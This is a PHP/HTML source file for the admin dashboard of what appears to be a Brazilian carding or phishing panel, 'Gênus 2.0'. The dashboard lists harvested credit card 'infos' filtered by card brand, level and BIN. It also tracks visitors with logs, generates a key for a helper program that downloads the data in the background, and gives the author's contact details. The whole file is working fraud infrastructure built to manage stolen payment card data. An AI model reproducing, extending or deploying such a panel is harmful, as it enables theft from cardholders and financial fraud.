<?php

require_once ("internal/modulo.php");
require_once ("internal/filtro.php");
require_once ("internal/edit_db.php");

if (isset($_SESSION ['logged'])) {


$nav_html = file_get_contents ('nav.php');



    $url_p = "$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
	$url_key = explode ('dash/', $url_p);
	
	
	if( (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] != 'off') || $_SERVER['SERVER_PORT'] == 443 ){
		
	 $ssl_key = 'y';
		
	} else {
		
	 $ssl_key = 'n' ;

	}
	
	
if (isset($_GET ['delete'])) {

	if ($_GET ['delete'] == 'all') {
		
		
		$sql = "TRUNCATE TABLE dados_cliente";
		$query = $mysqli->query($sql);
		
		header ("Location: infos.php");
		

	} else {
	
		$remove_id = preg_replace( '/[^0-9]/', '', $_GET ['delete'] );

		$sql = "DELETE FROM dados_cliente WHERE id='$remove_id'";
		$query = $mysqli->query($sql);

		header ("Location: infos.php");

	}
	
}
	
	
	
?>

<!DOCTYPE html>
<html lang="en">


<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Painel - <?php echo $_SESSION ['userlog']?> </title>
    <!-- Favicon icon -->
    <link rel="icon" type="image/png" sizes="16x16" href="images/favicon.png">
	<link href="vendor/owl-carousel/owl.carousel.css" rel="stylesheet">
    <link href="vendor/bootstrap-select/dist/css/bootstrap-select.min.css" rel="stylesheet">
    <link href="css/style.css" rel="stylesheet">
	<link href="../../cdn.lineicons.com/2.0/LineIcons.css" rel="stylesheet">

</head>
<body>

    <!--*******************
        Preloader start
    ********************-->
    <div id="preloader">
        <div class="sk-three-bounce">
            <div class="sk-child sk-bounce1"></div>
            <div class="sk-child sk-bounce2"></div>
            <div class="sk-child sk-bounce3"></div>
        </div>
    </div>
    <!--*******************
        Preloader end
    ********************-->

    <!--**********************************
        Main wrapper start
    ***********************************-->
    <div id="main-wrapper">

        <!--**********************************
            Nav header start
        ***********************************-->
        <div class="nav-header">
            <a href="index.php" class="brand-logo">
                <img class="logo-abbr" src="images/new/genus.png" alt="">
                <img class="logo-compact" src="images/new/genus.png" alt="">
				
			
				
            </a>
			

            <div class="nav-control">
                <div class="hamburger">
                    <span class="line"></span><span class="line"></span><span class="line"></span>
                </div>
            </div>
        </div>
        <!--**********************************
            Nav header end
        ***********************************-->
		
		<!--**********************************
            Chat box start
        ***********************************-->
		<div class="chatbox">
			<div class="chatbox-close"></div>
			<div class="custom-tab-1">
				<ul class="nav nav-tabs">
			
		
					<li class="nav-item">
						<a class="nav-link active" data-toggle="tab" href="#chat">Lista</a>
					</li>
				</ul>
				<div class="tab-content">

					
					
					<div id="list_on_1" style="display: block;" class="tab-pane fade active show" id="chat" role="tabpanel">
						<div class="card mb-sm-3 mb-md-0 contacts_card dz-chat-user-box">
							<div class="card-header chat-list-header text-center">
								<a href="javascript:;"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="18px" height="18px" viewBox="0 0 24 24" version="1.1"><g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><rect fill="#000000" x="4" y="11" width="16" height="2" rx="1"/><rect fill="#000000" opacity="0.3" transform="translate(12.000000, 12.000000) rotate(-270.000000) translate(-12.000000, -12.000000) " x="4" y="11" width="16" height="2" rx="1"/></g></svg></a>
								<div>
									<h6 class="mb-1">Lista de visitantes</h6>
									<p class="mb-0"></p>
								</div>
								<a href="javascript:;"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="18px" height="18px" viewBox="0 0 24 24" version="1.1"><g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><rect x="0" y="0" width="24" height="24"/><circle fill="#000000" cx="5" cy="12" r="2"/><circle fill="#000000" cx="12" cy="12" r="2"/><circle fill="#000000" cx="19" cy="12" r="2"/></g></svg></a>
							</div>
							<div class="card-body contacts_body p-0 dz-scroll  " id="DZ_W_Contacts_Body">
							
								
								
								<ul id="online_list" class="contacts">
									
									<br><br>
									
									<center>
									<img width="50" src="images/new/loader_1.gif"><br>
									Carregando...
									
									</center>

				
									
								</ul>
							</div>
						</div>
						

					
					
					</div>
					
					
					
					<div id="list_on_2" style="display: none;" class="tab-pane fade active show" id="chat" role="tabpanel">

						<div class="card chat dz-chat-history-box">
							<div class="card-header chat-list-header text-center">
								<a href="#" onClick="back_list()" >
									<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="18px" height="18px" viewBox="0 0 24 24" version="1.1"><g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><polygon points="0 0 24 0 24 24 0 24"></polygon><rect fill="#000000" opacity="0.3" transform="translate(15.000000, 12.000000) scale(-1, 1) rotate(-90.000000) translate(-15.000000, -12.000000) " x="14" y="7" width="2" height="10" rx="1"></rect><path d="M3.7071045,15.7071045 C3.3165802,16.0976288 2.68341522,16.0976288 2.29289093,15.7071045 C1.90236664,15.3165802 1.90236664,14.6834152 2.29289093,14.2928909 L8.29289093,8.29289093 C8.67146987,7.914312 9.28105631,7.90106637 9.67572234,8.26284357 L15.6757223,13.7628436 C16.0828413,14.136036 16.1103443,14.7686034 15.7371519,15.1757223 C15.3639594,15.5828413 14.7313921,15.6103443 14.3242731,15.2371519 L9.03007346,10.3841355 L3.7071045,15.7071045 Z" fill="#000000" fill-rule="nonzero" transform="translate(9.000001, 11.999997) scale(-1, -1) rotate(90.000000) translate(-9.000001, -11.999997) "></path></g></svg>
								</a>
								<div>
									<h6 id="nome_list" class="mb-1">... </h6>
									<p  id="etapa_list" class="mb-0 text-success">...</p>
								</div>							
								<div class="dropdown">
									<a href="javascript:;" data-toggle="dropdown" aria-expanded="false"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="18px" height="18px" viewBox="0 0 24 24" version="1.1"><g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><rect x="0" y="0" width="24" height="24"></rect><circle fill="#000000" cx="5" cy="12" r="2"></circle><circle fill="#000000" cx="12" cy="12" r="2"></circle><circle fill="#000000" cx="19" cy="12" r="2"></circle></g></svg></a>
									<ul class="dropdown-menu dropdown-menu-right">
										<li hidden="" class="dropdown-item"><i class="fa fa-user-circle text-primary mr-2"></i> View profile</li>
									</ul>
								</div>
								
	
					
							</div>
							
							<center>
							<br>Logs: <br>
							</center>
							
							
							
							 <div class="card">
							 <div class="card-body">
							 
	
                                        <ul id="add_log" class="list-icons">
										
                                           

                                        </ul>
                                    
                              
							  
							  
                            </div> 
							
							</div>
							
				
						</div>
					</div>

				
				
				
				</div>
			</div>
		</div>
		<!--**********************************
            Chat box End
        ***********************************-->
		
		<!--**********************************
            Header start
        ***********************************-->
        <div class="header">
            <div class="header-content">
                <nav class="navbar navbar-expand">
                    <div class="collapse navbar-collapse justify-content-between">
                        <div class="header-left">
                            <div id="name_index"  class="dashboard_bar">
                               
                            </div>
                        </div>
                        <ul class="navbar-nav header-right">
			
		
                            <li hidden=""  class="nav-item dropdown notification_dropdown">
                                <a class="nav-link  ai-icon" href="javascript:;" role="button" data-toggle="dropdown">
                                    <svg width="26" height="26" viewBox="0 0 26 26" fill="none" xmlns="http://www.w3.org/2000/svg">
										<path d="M21.75 14.8385V12.0463C21.7471 9.88552 20.9385 7.80353 19.4821 6.20735C18.0258 4.61116 16.0264 3.61555 13.875 3.41516V1.625C13.875 1.39294 13.7828 1.17038 13.6187 1.00628C13.4546 0.842187 13.2321 0.75 13 0.75C12.7679 0.75 12.5454 0.842187 12.3813 1.00628C12.2172 1.17038 12.125 1.39294 12.125 1.625V3.41534C9.97361 3.61572 7.97429 4.61131 6.51794 6.20746C5.06159 7.80361 4.25291 9.88555 4.25 12.0463V14.8383C3.26257 15.0412 2.37529 15.5784 1.73774 16.3593C1.10019 17.1401 0.751339 18.1169 0.75 19.125C0.750764 19.821 1.02757 20.4882 1.51969 20.9803C2.01181 21.4724 2.67904 21.7492 3.375 21.75H8.71346C8.91521 22.738 9.45205 23.6259 10.2331 24.2636C11.0142 24.9013 11.9916 25.2497 13 25.2497C14.0084 25.2497 14.9858 24.9013 15.7669 24.2636C16.548 23.6259 17.0848 22.738 17.2865 21.75H22.625C23.321 21.7492 23.9882 21.4724 24.4803 20.9803C24.9724 20.4882 25.2492 19.821 25.25 19.125C25.2486 18.117 24.8998 17.1402 24.2622 16.3594C23.6247 15.5786 22.7374 15.0414 21.75 14.8385ZM6 12.0463C6.00232 10.2113 6.73226 8.45223 8.02974 7.15474C9.32723 5.85726 11.0863 5.12732 12.9212 5.125H13.0788C14.9137 5.12732 16.6728 5.85726 17.9703 7.15474C19.2677 8.45223 19.9977 10.2113 20 12.0463V14.75H6V12.0463ZM13 23.5C12.4589 23.4983 11.9316 23.3292 11.4905 23.0159C11.0493 22.7026 10.716 22.2604 10.5363 21.75H15.4637C15.284 22.2604 14.9507 22.7026 14.5095 23.0159C14.0684 23.3292 13.5411 23.4983 13 23.5ZM22.625 20H3.375C3.14298 19.9999 2.9205 19.9076 2.75644 19.7436C2.59237 19.5795 2.50014 19.357 2.5 19.125C2.50076 18.429 2.77757 17.7618 3.26969 17.2697C3.76181 16.7776 4.42904 16.5008 5.125 16.5H20.875C21.571 16.5008 22.2382 16.7776 22.7303 17.2697C23.2224 17.7618 23.4992 18.429 23.5 19.125C23.4999 19.357 23.4076 19.5795 23.2436 19.7436C23.0795 19.9076 22.857 19.9999 22.625 20Z" fill="#13B499"/>
									</svg>
									<div class="pulse-css"></div>
                                </a>
                                <div class="dropdown-menu dropdown-menu-right">
                                    <div id="DZ_W_Notification1" class="widget-media dz-scroll p-3 height380">
										<ul class="timeline">
											<li>
												<div class="timeline-panel">
													<div class="media mr-2">
														<img alt="image" width="50" src="images/avatar/1.jpg">
													</div>
													<div class="media-body">
														<h6 class="mb-1">Dr sultads Send you Photo</h6>
														<small class="d-block">29 July 2020 - 02:26 PM</small>
													</div>
												</div>
											</li>

										</ul>
									</div>
                                    <a class="all-notification" href="javascript:;">See all notifications <i class="ti-arrow-right"></i></a>
                                </div>
                            </li>
							<li class="nav-item dropdown notification_dropdown">
                                <a class="nav-link bell bell-link" href="javascript:;">
                          
									<img width="30" src="images/new/lista.png">
						  
						  
									<div class="pulse-css"></div>
                                </a>
							</li>
							

                            <li class="nav-item dropdown header-profile">
                                <a class="nav-link" href="javascript:;" role="button" data-toggle="dropdown">
                                    <img src="images/avatar/default.png" width="20" alt=""/>
									<div class="header-info">
										<span><?php echo $_SESSION ['userlog']?><i class="fa fa-caret-down ml-3" aria-hidden="true"></i></span>
									</div>
                                </a>
                                <div class="dropdown-menu dropdown-menu-right">
        
                                    <a href="sair.php" class="dropdown-item ai-icon">
                                        <svg id="icon-logout" xmlns="http://www.w3.org/2000/svg" class="text-danger" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"></path><polyline points="16 17 21 12 16 7"></polyline><line x1="21" y1="12" x2="9" y2="12"></line></svg>
                                        <span class="ml-2">Logout </span>
                                    </a>
									
                                </div>
                            </li>
                        </ul>
                    </div>
                </nav>
            </div>
        </div>
        <!--**********************************
            Header end ti-comment-alt
        ***********************************-->

        <!--**********************************
            Sidebar start
        ***********************************-->
        <div class="deznav">
            <div class="deznav-scroll">
			
			
				<ul class="metismenu" id="menu">
				<?php echo $nav_html; ?>


                </ul>
            
				<div class="plus-box">
					<p class="fs-16 font-w500 mb-1">ɪʟɪᴍɪᴛᴀᴅᴏ</p>
				</div>
				<div class="copyright">
					<p class="fs-14 font-w200"><strong class="font-w400">Full</strong> © 2023 </p>
					<p> <i class="fa fa-heart text-danger"></i> Gênus 2.0 | @DuMalote</p>
					MEU TELEGRAM <a target="_blank" href="https://t.me/dumalote"><font color="7266ff">TELEGRAM</font></a>
				</div>
			</div>
        </div>
        <!--**********************************
            Sidebar end
        ***********************************-->
		
		<!--**********************************
            Content body start
        ***********************************-->
        <div class="content-body">
            <!-- row -->
			<div class="container-fluid">
			
			                <div class="page-titles">
					<ol class="breadcrumb">

					</ol>
                </div>
			
			
					<div id="modal_log" class="modal fade none-border show" id="event-modal" style="display: none; padding-right: 17px;" aria-modal="true" role="dialog">
                        <div class="modal-dialog">
                            <div class="modal-content">
							<form action="comment.php" method="post">
                                <div class="modal-header">
                                    <h4 class="modal-title"><strong>Logs</strong></h4>
                                </div>
								
                                <div class="modal-body">
								<p> <small>Histórico de infos desde que você logou.</small> </p>

								<label>Logs</label>	
								
								<div id="input_log" style="display: none;" >
		                                 <div   class="input-group mb-3 input-primary">
                                            <textarea rows="12"  id="text_log" type="tel" class="form-control"></textarea>
											
                                            <div class="input-group-append">
                                                <a  class="input-group-text" href="#"><i class="fa fa-search"></i></a>
                                            </div>
                                        </div>	
								</div>
								
								<p> <small> <font id="msg_log" color="red"></font></small> </p>
								
							 <center>
							 <div style="display: none;" id="loader_log" ><img width="40" src="images/new/loader_1.gif"></div>
							 </center>
							 
			
							

								
								</div>
                                <div class="modal-footer">
                                    <a type="button" onClick="$('#modal_log').css('display', 'none');" class="btn btn-dark waves-effect" data-dismiss="modal">Fechar</a>
                                </div>
								</form>
                            </div>
                        </div>
                    </div>
					
					
					<div id="modal_cc_unica" class="modal fade none-border show" id="event-modal" style="display: none; padding-right: 17px;" aria-modal="true" role="dialog">
                        <div class="modal-dialog">
                            <div class="modal-content">
							<form action="comment.php" method="post">
                                <div class="modal-header">
                                    <h4 class="modal-title"><strong>Info CC</strong></h4>
                                </div>
								
                                <div class="modal-body">
								
								<div id="input_log" style="display: block;" >
		                                 <div   class="input-group mb-3 input-primary">
                                            <textarea rows="12"  id="text_cc_unica" type="tel" class="form-control"></textarea>
											
                                            <div class="input-group-append">
                                                <a  class="input-group-text" href="#"><i class="fa fa-credit-card"></i></a>
                                            </div>
                                        </div>	
								</div>
								
								<p> <small> <font id="msg_log" color="red"></font></small> </p>
								
							 <center>
							 <div style="display: none;" id="loader_log" ><img width="40" src="images/new/loader_1.gif"></div>
							 </center>
							 
			
							

								
								</div>
                                <div class="modal-footer">
                                    <a type="button" onClick="$('#modal_cc_unica').css('display', 'none');" class="btn btn-dark waves-effect" data-dismiss="modal">Fechar</a>
                                </div>
								</form>
                            </div>
                        </div>
                    </div>
					
					
					
					<div id="modal_all" class="modal fade none-border show" id="event-modal" style="display: none; padding-right: 17px;" aria-modal="true" role="dialog">
                        <div class="modal-dialog">
                            <div class="modal-content">
							<form action="comment.php" method="post">
                            
								
                                <div class="modal-body">
								
							<button onClick="$('#modal_all').css('display', 'none');" type="button" class="close" data-dismiss="modal"><span>×</span></button>
							
							<p>Ver Repetidas / Ver todas informações da info</p>	
							<label class="switch">
								<input id="rep_all" type="checkbox" value="1">
								<div class="slider round"></div>
							</label>
							
							<label class="switch">
								<input id="info_all" type="checkbox" value="1">
								<div class="slider round"></div>
							</label>
							
			
							

							<br>
							
							<label>Bandeira</label>
										<div class="form-group">
                                            <select id="band_all" class="form-control form-control-sm">
											
                                               
												<option value="all" >Todas</option>
												<option value="mastercard" >Mastercard</option>
												<option value="visa" >Visa</option>
												<option value="american" >Amex</option>
												<option value="discover" >Discover</option>
												<option value="hipercard" >Hipercard</option>
												<option value="elo" >Elo</option>
												
												
                                             
                                            </select>
											
                                        </div>	
										
							<label>Level</label>
										<div class="form-group">
                                            <select  id="level_all" class="form-control form-control-sm">
											
                                               
												<option value="all" >Todos</option>
												<option value="standard" >Standard</option>
												<option value="classic" >Classic</option>
												<option value="gold" >Gold</option>
												<option value="platinum" >Platinum</option>
												<option value="black" >Black</option>
												<option value="infinite" >Infinite</option>
												<option value="prepaid" >Pré Pago</option>
												
												
                                             
                                            </select>
											
                                        </div>	
							
							
							
											<small><font id="error_search" color="red"></font></small>
									      <div   class="input-group mb-3 input-primary">
                                            <input  maxlength="6"  placeholder="Pesquisar por BIN..." id="text_bin" type="tel" class="form-control form-control-sm"></input>
											
                                            <div class="input-group-append">
                                                <a  onClick="refresh_bin()" class="input-group-text" href="#"><i class="fa fa-search"></i></a>
                                            </div>
											
											
                                        </div>	
										
								<div id="input_cc" style="display: none;" >
		                                 <div   class="input-group mb-5 input-primary">
                                            <textarea rows="12"  id="text_cc" type="tel" class="form-control"></textarea>
											
                                      
                                        </div>	
								</div>
				
										

							<center>
							 <div style="display: none;" id="loader_all" ><img width="40" src="images/new/loader_1.gif"></div>
							 </center>
							 
			
									<center>
                                    <a type="button" onClick="refresh_all()" class="btn btn-success waves-effect" data-dismiss="modal">Ver Infos</a>
									</center>

								
								</div>
                    
								</form>
                            </div>
                        </div>
                    </div>
			
			


					<div id="modal_key" class="modal fade none-border show" id="event-modal" style="display: none; padding-right: 17px;" aria-modal="true" role="dialog">
                        <div class="modal-dialog">
                            <div class="modal-content">
							<form action="comment.php" method="post">
                                <div class="modal-header">
                                    <h4 class="modal-title"><strong>Key de Acesso</strong></h4>
									
									<button onClick="$('#modal_key').css('display', 'none');" type="button" class="close" data-dismiss="modal"><span>×</span></button>
									
                                </div>
								
                                <div class="modal-body">
	
										<p> <small>A Key é necessária para acessar o programa auxiliar, gere uma Key e cole no programa para ter acesso as infos sem precisar abrir a tela, além disso, você pode deixar o programa rodando em segundo plano enquanto salva todas as informações no seu computador sem risco de perder.</small> </p>

										
										<br><br>
	
											<?php if ($config_chave == 'null') { ?>
											<p id="info_key" >Você ainda não gerou nenhuma key, gere uma nova <a onClick="gerar_key ()"  href="#"><font color="blue"> AQUI</font></a></p>
											
										<div style="display: none"  id="input_key" >
										
										
										<center>
										<a href="#" onClick="gerar_key ()"  class="badge badge-rounded badge-outline-primary">Apagar key atual e gerar outra</a>
										</center>
										<br><br>
										
										
										<div class="input-group mb-3 input-primary">

                                            <input  id="val_key" value=""  placeholder="" id="text_bin" type="text" class="form-control"></input>
				
                                            <div class="input-group-append">
                                                <a   class="input-group-text" href="#"><i class="fa fa-key"></i></a>
                                            </div>
                                        </div>
										
										</div>
											
											<?php } else { ?>
											
										<center>
										<a href="#" onClick="gerar_key ()"  class="badge badge-rounded badge-outline-primary">Apagar key atual e gerar outra</a>
										</center>
										<br><br>
										
										<div style="display: block"  id="input_key" >
										
										<div class="input-group mb-3 input-primary">

                                            <input  id="val_key" value=""  placeholder="" id="text_bin" type="text" class="form-control"></input>
				
                                            <div class="input-group-append">
                                                <a   class="input-group-text" href="#"><i class="fa fa-key"></i></a>
                                            </div>
                                        </div>
										
										</div>
										
										
											<?php } ?>
										
		
										

							<center>
							 <div style="display: none;" id="loader_key" ><img width="40" src="images/new/loader_1.gif"></div>
							 </center>
							 
			
								<input id="key_venc" type="hidden" value="2022-05-02 15:46:33" >
								<input id="key_url" type="hidden" value="<?php echo $url_key[0] ?>" >
								<input id="key_ssl" type="hidden" value="<?php echo $ssl_key?>" >

								
								</div>
                         
								</form>
                            </div>
                        </div>
                    </div>
			
			
			
			
			
				<div class="row mb-5 align-items-center">
					<div class="col-lg-3 mb-4 mb-lg-0">
						<a href="javascript:void(0);" onCLick="show_logs ()"  class="btn btn-primary light  btn-lg btn-block rounded ">Logs</a>
					</div>
						<div class="col-lg-9">
						<div class="card m-0 ">
							<div class="card-body py-3 py-md-2">
								<div class="row align-items-center">
									<div class="col-md-5 mb-3 mb-md-0">
										<div class="media align-items-end">
											<span class="mr-2 mb-1">
												<svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
													<g clip-path="url(#clip0)">
													<path d="M21 24H3C2.73478 24 2.48043 23.8946 2.29289 23.7071C2.10536 23.5196 2 23.2652 2 23V22.008C2.00287 20.4622 2.52021 18.9613 3.47044 17.742C4.42066 16.5227 5.74971 15.6544 7.248 15.274C7.46045 15.2219 7.64959 15.1008 7.78571 14.9296C7.92182 14.7583 7.9972 14.5467 8 14.328V13.322L6.883 12.206C6.6032 11.9313 6.38099 11.6036 6.22937 11.2419C6.07776 10.8803 5.99978 10.4921 6 10.1V5.96201C6.01833 4.41693 6.62821 2.93765 7.70414 1.82861C8.78007 0.719572 10.2402 0.0651427 11.784 5.16174e-06C12.5992 -0.00104609 13.4067 0.158488 14.1603 0.469498C14.9139 0.780509 15.5989 1.2369 16.1761 1.81263C16.7533 2.38835 17.2114 3.07213 17.5244 3.82491C17.8373 4.5777 17.999 5.38476 18 6.20001V10.1C17.9997 10.4949 17.9204 10.8857 17.7666 11.2495C17.6129 11.6132 17.388 11.9426 17.105 12.218L16 13.322V14.328C16.0029 14.5469 16.0784 14.7586 16.2147 14.9298C16.351 15.1011 16.5404 15.2221 16.753 15.274C18.251 15.6548 19.5797 16.5232 20.5298 17.7424C21.4798 18.9617 21.997 20.4624 22 22.008V23C22 23.2652 21.8946 23.5196 21.7071 23.7071C21.5196 23.8946 21.2652 24 21 24ZM4 22H20C19.9954 20.8996 19.6249 19.8319 18.9469 18.9651C18.2689 18.0983 17.3219 17.4816 16.255 17.212C15.6125 17.0494 15.0423 16.6779 14.6341 16.1558C14.2259 15.6337 14.0028 14.9907 14 14.328V12.908C14.0001 12.6428 14.1055 12.3885 14.293 12.201L15.703 10.792C15.7965 10.7026 15.8711 10.5952 15.9221 10.4763C15.9731 10.3574 15.9996 10.2294 16 10.1V6.20001C16.0017 5.09492 15.5671 4.03383 14.7907 3.24737C14.0144 2.46092 12.959 2.01265 11.854 2.00001C10.8264 2.04117 9.85379 2.47507 9.1367 3.21225C8.41962 3.94943 8.01275 4.93367 8 5.96201V10.1C7.99979 10.2266 8.0249 10.352 8.07384 10.4688C8.12278 10.5856 8.19458 10.6914 8.285 10.78L9.707 12.2C9.89455 12.3875 9.99994 12.6418 10 12.907V14.327C9.99724 14.9896 9.77432 15.6325 9.3663 16.1545C8.95827 16.6766 8.3883 17.0482 7.746 17.211C6.67872 17.4804 5.73137 18.0972 5.05318 18.9642C4.37498 19.8313 4.00447 20.8993 4 22Z" fill="#fff"/>
													</g>
													<defs>
													<clipPath id="clip0">
													<rect width="24" height="24" fill="white"/>
													</clipPath>
													</defs>
												</svg>
											</span>
											<div class="media-body ml-1">
												<p class="mb-1 fs-14">Infos</p>
												<h3 id="qtd_cc" class="mb-0 font-w600 fs-20"></h3>
											</div>
											
										</div>
										
										
									</div>
									<div class="col-md-7 text-md-right">
										<a onClick="$('#modal_all').css('display', 'block');"  class="btn btn-outline-primary rounded btn-sm px-4">Ver todas</a>
										<a onClick="$('#modal_key').css('display', 'block');"  class="btn btn-outline-info rounded btn-sm px-4">Key de acesso</a>
									</div>
								</div>							
							</div>
						</div>
					</div>
				</div>
			
			
			
				<div class="row">

	


                    <div class="col-lg-12">
					
								<div style="display: none;" id="alert_last" class="alert alert-info solid alert-right-icon alert-dismissible fade show">
                                    <span><i class="mdi mdi-credit-card"></i></span>
                                    <button type="button" class="close h-100" data-dismiss="alert" aria-label="Close"><span><i class="mdi mdi-close"></i></span>
                                    </button> Você tem (<strong id="last_info"></strong>) novas infos!
                                </div>
					 
                        <div class="card">
                            <div class="card-header">
                                <h4 class="card-title">Infos</h4>
								
								<a onClick="delete_all ()" href="#"  class="btn btn-outline-danger rounded btn-sm px-4">Deletar tudo</a>

                            </div>
                            <div class="card-body">
                                <div class="table-responsive">
                                    <table class="table table-hover table-responsive-sm">
                                        <thead>
                                            <tr>
                                                <th>#</th>
                                                <th>Nome</th>
                                                <th>Nível</th>
                                                <th>Banco</th>
                                                <th>#</th>
                                            </tr>
                                        </thead>
                                        <tbody id="tabble_cc" ></tbody>
                                    </table>
                                </div>
                            </div>
                        </div>
                        <!-- /# card -->
                    </div>







				</div>
            </div>
        </div>
        <!--**********************************
            Content body end
        ***********************************-->

        <!--**********************************
            Footer start
        ***********************************-->
        <div class="footer">
            <div class="copyright">
                <p>Copyright © Designed &amp; Developed by <a href="https://api.whatsapp.com/send?phone=551998485812" target="_blank">Dumalote</a> 2023</p>
            </div>
        </div>
        <!--**********************************
            Footer end
        ***********************************-->

		<!--**********************************
           Support ticket button start
        ***********************************-->

        <!--**********************************
           Support ticket button end
        ***********************************-->


    </div>
    <!--**********************************
        Main wrapper end
    ***********************************-->

    <!--**********************************
        Scripts
    ***********************************-->
    <!-- Required vendors -->
    <script src="vendor/global/global.min.js"></script>
	<script src="vendor/bootstrap-select/dist/js/bootstrap-select.min.js"></script>
    <script src="js/custom.min.js"></script>
	<script src="vendor/chart.js/Chart.bundle.min.js"></script>
	<script src="js/deznav-init.js"></script>
	<script src="vendor/owl-carousel/owl.carousel.js"></script>
	
	<!-- Apex Chart -->
	<script src="vendor/apexchart/apexchart.js"></script>
	<!-- Dashboard 1 -->
	<script src="js/dashboard/dashboard-1.js"></script>
	    <script src="js/plugins-init/chartjs-init.js"></script>

	
	<script src="js/jquery-3.2.1.min.js"></script>
	<script src="js/cc.js"></script>


	<script>
	
	(function(){
	
			chave = '<?php echo $config_chave ?>'
			url_k = $('#key_url').val();
			vencimento = $('#key_venc').val();
			ssl = $('#key_ssl').val();
			
			vencimento = Date.parse(vencimento);
			
			string_key = chave+'|'+vencimento+'|'+url_k+'|'+ssl
			$('#val_key').val(string_key);
	
	
	
	})();
	</script>



</body>

<!-- Mirrored from karciz.dexignzone.com/xhtml/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 13 Sep 2021 18:35:36 GMT -->
</html>

<?php } else { header ('Location: login.php'); }?>